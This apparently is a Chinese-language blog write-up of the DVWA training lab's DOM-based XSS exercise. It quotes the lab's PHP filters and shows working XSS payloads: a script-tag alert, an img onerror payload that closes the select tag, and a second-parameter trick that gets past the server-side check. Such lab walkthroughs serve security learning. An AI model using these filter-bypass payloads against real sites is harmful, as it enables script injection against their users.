---
title:      "跨站脚本攻击（dom）---dvwa"
description: "主要用来记录dvwa靶场 跨站脚本攻击（dom）破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-30
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/xss(dom)/"
categories: [ "网安" ]
---
>强烈建议先学习下
> 
> [反射型XSS](https://fan-bu-fan.github.io/2022/6/xss(reflected)/)
> 
> [存储型XSS](https://fan-bu-fan.github.io/2022/6/xss(stored)/)

## DOM型XSS 简介
>DOM是一个与平台，编程语言无关的“端口”，它允许程序或者脚本动态的访问和更新文档内容、结果和样式，处理后的结果能够成为显示的一部分，不依赖于提交数据到服务器端，从而客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格的确定，就会产生DOM型XSS漏洞。
    但和反射型的区别是，构造的URL参数不用发送到服务器端，直接是在本地执行的，所以在有些情况下可以绕过WAF等防护。 


## Low 级别破解
> 查看源码
```php
<?php

# No protections, anything goes

?> 
```
>服务器这端没有做任何过滤保护
> 
> DVWA的DOM型XSS场景是一个选择下拉框
![直接输入](/img/xss(dom)/1-1.png)
> 我们选择"Spanish"提交后，URL和下拉框的内容都发生了变化
![直接输入](/img/xss(dom)/1-2.png)
> DOM型XSS的脚本不会提交到服务器端，都是本地运行的，所以我们通过调试器看下源码
![直接输入](/img/xss(dom)/1-3.png)
> 这里存在DOM型XSS的注入点，我们做个简单的测试，直接在URL的default后面输入test

直接在URL的default后面输入test 发现页面当中会有test字样
![直接输入](/img/xss(dom)/1-4.png)

我们可以构造Payload放到default后面:
输入 `<script>alert(111)</script>` 后发现弹出弹框
![直接输入](/img/xss(dom)/1-5.png)

## Medium 级别破解
> 查看源码
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?> 
```
>在服务器代码侧对提交的default内容用stripos来匹配<script，这个函数不区分大小写。这样`<script>`标签就被过滤了

#### 方法1:可以采用`<img>`标签绕过
在页面中的default中输入`<img src=1 onerror=alert(111)>`
![直接输入](/img/xss(dom)/1-6.png)
尝试把`<option>`标签闭合掉 `</option><img src=1onerror=alert(111)>` 可还是没有弹框,说明还没有绕过
![直接输入](/img/xss(dom)/1-7.png)

我们尝试下把`<select>`标签闭合`</select><img src=1 onerror=alert(111)>`
![直接输入](/img/xss(dom)/1-8.png)
执行成功有弹框了

##  方法2: <span id= "jump">可以采用双参数来绕过</span>
    服务端只是检测default这个参数中是否有<script>标签，那我们就想办法再增加参数来绕过这个限制

在default后面添加`&test=<script>alert(111)</script>` 后为:

    http://127.0.0.1/vulnerabilities/xss_d/?default=French&test=<script>alert(111)</script>
![直接输入](/img/xss(dom)/1-9.png)
 成功弹出弹框


## High 级别破解
> 查看源码
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?> 
```

>服务器端对default参数进行了严格的匹配，只能是这四种字符串，因此`<image>`标签就无法绕过了。
但是**“双参数绕过”**的方式依然有效。
    
可以参考[medium中双参数验证](#jump)的方式
![直接输入](/img/xss(dom)/3-1.png)
